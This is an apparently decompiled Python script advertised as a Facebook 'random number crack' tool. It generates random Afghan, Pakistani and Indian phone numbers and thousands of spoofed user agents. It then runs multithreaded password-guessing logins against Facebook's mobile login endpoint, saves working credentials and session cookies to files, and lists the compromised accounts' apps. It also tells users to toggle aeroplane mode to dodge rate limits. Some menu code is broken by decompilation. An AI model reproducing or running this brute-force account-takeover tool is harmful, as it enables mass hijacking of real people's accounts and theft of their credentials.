# writh :BY NASRAT
# File: test.pyc (Python 3.9)
#If You Wanna Take Credits For This Code, Please Look Yourself Again...

import os
import sys
import time
import requests
import uuid
os.system('git pull')
os.system('pkg install curl')

class jalan:
    
    def __init__(self, z):
        pass


logo = '   \n\x1b[1;32m       888    d8P  8888888b.   .d8888b.  \n\x1b[1;35m       888   d8P   888   Y88b d88P  Y88b \n\x1b[1;35m       888  d8P    888    888 Y88b.      \n\x1b[1;32m       888d88K     888   d88P  "Y888b.   \n\x1b[1;32m       8888888b    8888888P"      "Y88b. \n\x1b[1;35m       888  Y88b   888 T88b         "888 \n\x1b[1;35m       888   Y88b  888  T88b  Y88b  d88P \n\x1b[1;32m       888    Y88b 888   T88b  "Y8888P"  \n\n\x1b[1;37m================= \x1b[32;4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZVx1b[0;m\x1b[1;32m && \x1b[1;33mNASRAT\x1b[0;m\n\x1b[1;32m     \x1b[1;32mFACEBOK      : \x1b[1;34m Loy Rayess kabul \n\x1b[1;32m     \x1b[1;35mGITHUB       :  \x1b[1;35mTEAM-HACKIN\n\x1b[1;32m     \x1b[1;36mTOOL STATUS  :  \x1b[1;36mTOOL IS FREE\n\x1b[1;32m     \x1b[1;35mTEAM         :  \x1b[1;35mHACKIN\n\x1b[1;32m     \x1b[1;36mTOOL VIRSION :  \x1b[1;36m2.3\n\x1b[1;37m================= \x1b[32;4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyFTLRNyDmT1a1boZV================== \x1b[32;45mMr.n\x1b[0;m ======================\n'

def ud():
    os.system('clear')
    jalan(logo)
    print(' [1] FOLLOW MY FACEBOOK')
    print(' [2] EXIT')
    opt = input('\n   Choose option >>> ')
    if opt == '1':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100000820489189&mibextid=D4KYlr')
        FD()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')


def FD():
    os.system('clear')
    print(logo)
    print('\x1b[1;33m [1] FOLLOW MY Youtube🖤❤💚')
    print(' [2] EXIT')
    opt = input('\n  \x1b[1;32m Choose option >>> ')
    if opt == '1':
        ('xdg-open https://www.youtube.com/@isatv3233')
        o()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')


def o():
    os.system('clear')
    jalan(logo)
    jalan('\t➩RANDOM NUMBER CRACK✔')
    print('')
    jalan('\x1b[1;32m [1]\x1b[1;33m RANDOM CRACK ')
    jalan('\x1b[1;32m [2] \x1b[1;32mCONTACT ME ON FACEBOOK')
    jalan(' \x1b[1;32m[3] \x1b[1;32mFOLLOW MY Youtube')
    jalan(' \x1b[1;32m[4] \x1b[1;32mFOLLOW MY FACEBOOK')
    jalan(' \x1b[1;32m[00] \x1b[1;31mEXIT')
    opt = input('\n   \x1b[1;32m Choose option >>> ')
    if opt == '1':
        i()
    if None == '2':
        ('xdg-open https://www.facebook.com/profile.php?id=100000820489189&mibextid=D4KYlr')
        return None
    if None == '3':
        os.system('https://www.youtube.com/@isatv3233')
        return None
    if None == '4':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100000820489189&mibextid=D4KYlr')
        return None
    if None == '0':
        os.system('exit')
        return None
    None('\n\x1b[1;31m  Choose valid option\x1b[0;97m')


import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[??] %s \x1b[1;95m ? Your Active Apps ?     :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[??] %s \x1b[1;95m ? Your Expired Apps ?    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')
 
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://free.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            
 
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo =                                          f"""{H}
      _____ _   _ _____ _____  ______ _____  
  / ____| \ | |_   _|  __ \|  ____|  __ \ 
 | (___ |  \| | | | | |__) | |__  | |__) |
  \___ \| . ` | | | |  ___/|  __| |  _  / 
  ____) | |\  |_| |_| |    | |____| | \ \ 
 |_____/|_| \_|_____|_|    |______|_|  \_\ AFG                                                             
     ــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــــ 
       \033[1;32m
\033[1;39m WELLCOME TO NASRAT COMMAND
\033[1;31m\033[1;32m \033[1;32mOWNER\033[1;31m \033[1;32m     NASRAT \033[1;31m
\033[1;31m\033[1;32m\033[1;32mFACEBOOK \033[1;31m\033[1;32m RaYes Ali\033[1;31m 
\033[1;31m\033[1;32m \033[1;32mGITHUB \033[1;31m \033[1;32m   RaYes Ali Lewany\033[1;31m 
\033[1;31m\033[1;32m\033[1;32mTELEGRAM \033[1;31m\033[1;32m tm.Ghazni_hack \033[1;31m 
\033[1;31m\033[1;32m\033[1;32m VERSION \033[1;31m \033[1;32m 0.1\033[1;31m 
\033[1;37mTELEGRAM GROUP (HACKIN TECH{ M }\033[1;37m 
\033[1;92m==========================================================
\033[33;44m  NAME       Ali & Hossini  🖤❤💚\033[0;m
\033[1;92m=========================================================="""      
loop = 0
oks = []
cps = []
 
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
 
#User agents
ugen2=[]
ugen=[]
 
for xd in range(5000):
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['7','8','9','10','11','12','13','14'])
    c=' en-us; Infinix '
    d=random.choice(['X677','F98', 'NOTE 2 LTE', 'NOTE 2', 'Hot', 'Hot 1', 'Note 3', 'NOTE 3 PRO', 'Hot 10', 'Hot 10 Play', 'Note 4', 'Note 4 Pro', 'Hot 10s', 'Note 5', 'Note 10s NFC', 'Note 5 Stylus', 'Note 6', 'Note 7 LTE', 'Note 7', 'Note 7 Lite', 'Hot 10T', 'Hot 11', 'Hot 11s', 'Hot 12', 'Hot 12 Play', 'Hot 12 Play NFC', 'HOT','Note 12 Pro 5G'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(44,160)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4.3','4.4.4','5.1.1','6.0','6.0.1','7.1.1','8.1.0','9','10','11','12','13','14'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'HOT','SMART'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(44,160)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android 12'
    b=random.choice(['4.3','4.4.4','5.1.1','6.0','6.0.1','7.1.1','8.1.0','9','10','11','12','13','14'])
    c=' en-us; TECNO '
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'HOT'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(44,160)
    l='Mobile Safari/537.36'
  #  ag = ['[FB_IAB/FB4A;FBAV/387.0.0.24.102;]', '[FB_IAB/FB4A;FBAV/371.0.0.24.109;]', '[FBAN/EMA;FBLC/ar_AR;FBAV/324.0.0.8.106;]', '[FB_IAB/FB4A;FBAV/388.0.0.32.105;]', '[FB_IAB/FB4A;FBAV/364.0.0.24.132;]', '[FB_IAB/FB4A;FBAV/386.0.0.35.108;]' ,'[FB_IAB/FB4A;FBAV/387.0.0.24.102;]' ,'[FB_IAB/FB4A;FBAV/387.0.0.24.102;]', '[FBAN/EMA;FBLC/ar_AR;FBAV/318.0.0.16.105;]', '[FB_IAB/FB4A;FBAV/365.0.0.30.112;]', '[FB_IAB/FB4A;FBAV/362.0.0.27.109;]', '[FB_IAB/FB4A;FBAV/360.0.0.30.113;]', '[FB_IAB/FB4A;FBAV/360.0.0.30.113;]', '[FB_IAB/Orca-Android;FBAV/376.1.0.25.106;]']
  #  m = random.choice(ag)
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
    aa='Mozilla/5.0 (Linux; Android 12'
    b=random.choice(['7','8','9','10','11','12','13','14'])
    c='Infinix '
    d=random.choice(['X677','F98', 'NOTE 2', 'NOTE 2', 'Hot', 'Hot 1', 'Note 3', 'NOTE 3 ', 'Hot 10', 'Hot 10 ', 'Note 4', 'Note 4 ', 'Hot 10s', 'Note 5', 'Note 10s ', 'Note 5', 'Note 6', 'Note 7 ', 'Note 7', 'Note 7 ', 'Hot 10T', 'Hot 11', 'Hot 11s', 'Hot 12', 'Hot 12 ', 'Hot 12 ', 'HOT','Note 12 '])
    e=random.randrange(1, 999)
    f=random.choice(['Pro 5G','Play NFC', 'Stylus', 'Play', 'NFC', 'Stylus', 'LTE', 'LITE', 'Lite', 'Zero', 'Pro', 'Play 5G', 'Pro NFC', 'i', 'VIP', '2020', '2022', 'Ultra', 'Ultra 5G', 'Smart 3G', 'Smart HD', 'Y88', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(44,160)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
  
  
    aa='Mozilla/5.0 (Linux; Android 12'
    b=random.choice(['4.3','4.4.4','5.1.1','6.0','6.0.1','7.1.1','8.1.0','9','10','11','12','13','14'])
    c=' en-us; Qmobile '
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'HOT','POWER'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(44,160)
    l='Mobile Safari/537.36'
    ag = ['[FB_IAB/FB4A;FBAV/387.0.0.24.102;]', '[FB_IAB/FB4A;FBAV/371.0.0.24.109;]', '[FBAN/EMA;FBLC/ar_AR;FBAV/324.0.0.8.106;]', '[FB_IAB/FB4A;FBAV/388.0.0.32.105;]', '[FB_IAB/FB4A;FBAV/364.0.0.24.132;]', '[FB_IAB/FB4A;FBAV/386.0.0.35.108;]' ,'[FB_IAB/FB4A;FBAV/387.0.0.24.102;]' ,'[FB_IAB/FB4A;FBAV/387.0.0.24.102;]', '[FBAN/EMA;FBLC/ar_AR;FBAV/318.0.0.16.105;]', '[FB_IAB/FB4A;FBAV/365.0.0.30.112;]', '[FB_IAB/FB4A;FBAV/362.0.0.27.109;]', '[FB_IAB/FB4A;FBAV/360.0.0.30.113;]', '[FB_IAB/FB4A;FBAV/360.0.0.30.113;]', '[FB_IAB/Orca-Android;FBAV/376.1.0.25.106;]']
    m = random.choice(ag)
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l} {m}')
    ugen.append(uaku2)
    
    
    aa='Mozilla/5.0 (Linux; Android 12; SM-G973F'
    b=random.choice(['4.3','4.4.4','5.1.1','6','6.0.1','7.1.1','8.1.0','9','10','11','12','13','14'])
    c=' en-us; HONOR '
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'HOT','POWER'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(44,160)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)



    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['4.3','4.4.4','5.1.1','6.0','6.0.1','7.1.1','8.1.0','9','10','11','12','13','14'])
    c=' en-us; Infinix '
    d=random.choice(['X677','F98', 'NOTE 2', 'NOTE 2', 'Hot', 'Hot 1', 'Note 3', 'NOTE 3 ', 'Hot 10', 'Hot 10 ', 'Note 4', 'Note 4 ', 'Hot 10s', 'Note 5', 'Note 10s ', 'Note 5', 'Note 6', 'Note 7 ', 'Note 7', 'Note 7 ', 'Hot 10T', 'Hot 11', 'Hot 11s', 'Hot 12', 'Hot 12 ', 'Hot 12 ', 'HOT','Note 12 '])
    e=random.randrange(1, 999)
    f=random.choice(['Pro 5G','Play NFC', 'Stylus', 'Play', 'NFC', 'Stylus', 'LTE', 'LITE', 'Lite', 'Zero', 'Pro', 'Play 5G', 'Pro NFC', 'i', 'VIP', '2020', '2022', 'Ultra', 'Ultra 5G', 'Smart 3G', 'Smart HD', 'Y88', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(44,160)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (Windows NT 10.0;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Win64; x64'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/108.0.0.0 Safari/537.36 Vivaldi/5.5.2805.50'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    
# APK CHECK
def i():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    jalan(logo)
    
    
    jalan("\033[1;37m\t  USE OUR COUNTRY CODE  ")
    jalan('\033[1;36m     \t     ✔AFG CODES\n     \033[1;33m9379, \033[1;33m9377 ,\033[1;33m9378 ,\033[1;33m9370  ...\033[0;97m')
    jalan('\033[1;32m============================================')
    jalan('\033[1;36m     \t     ✔PAK CODES\n     \033[1;33m92301, \033[1;33m92345 ,\033[1;33m92300 ,\033[1;33m92306  ...\033[0;97m')
    jalan('\033[1;32m============================================')
    jalan('\033[1;36m     \t     ✔INDIA CODES\n     \033[1;33m91778, \033[1;33m91930 ,\033[1;33m91902 ,\033[1;33m91712  ...\033[0;97m')
    jalan('\033[1;32m============================================\n')
    code = input(' PUT CODE : ')
    print("")
    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = int(input("[*] Enter Password Limit : "))
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input("[*] Enter Password : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print('\033[1;36m TOTAL IDS: '+tl)
        print('\033[1;36m THE PROCESS HAS BEEN STARTED')
        print('\033[1;31m USE AEROPLANE MOOD IN EVERY 4 MIN ')
        print('\033[1;32m============================================')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
                pwx.append(Eman)
            manshera.submit(rcrack,uid,pwx,tl)
    print('\033[1;32m============================================')
    print('Crack process has been completed')
    print('Ids saved in ok.txt,cp.txt')
    print('\033[1;32m============================================')
 
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb =  {
    'authority': 'x.facebook.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'datr=jRboZKkkWlD4hAfDY0fpErny; sb=jRboZDLFI-71m370snCg-JpV; locale=en_US; m_pixel_ratio=2.625; dpr=2.625; wd=412x724; fr=0iKjeQKOXB1qWFEmv.AWVUB1d5tlLXB6RSIggO53KMy1o.Bk6BdY.72.AAA.0.0.Bk6B41.AWVXunkP3x4',
    'dpr': '2.625',
    'origin': 'https://x.facebook.com',
    'referer': 'https://x.facebook.com/',
    'sec-ch-prefers-color-scheme': 'light',
    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="114", "Google Chrome";v="114"',
    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="114.0.5836.202", "Google Chrome";v="114.0.5836.202"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-model': '"SM-G975U"',
    'sec-ch-ua-platform': '"macOS"',
    'sec-ch-ua-platform-version': '""',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': pro,
    'viewport-width': '412',
    'x-asbd-id': '129477',
    'x-fb-lsd': 'AVrqBrF5Idc',
    'x-requested-with': 'XMLHttpRequest',
    'x-response-format': 'JSONStream',}

            lo = session.post('https://x.facebook.com/login/device-based/login/async/',data=log_data,headers=header_freefb).text,
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('    \033[1;32m(AKing🍪 -OK)  ' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/AKing-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(AKing-CP💔)  ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/AKing-CP.txt', 'a').write(uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[AKing➟OK] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
 
ud()


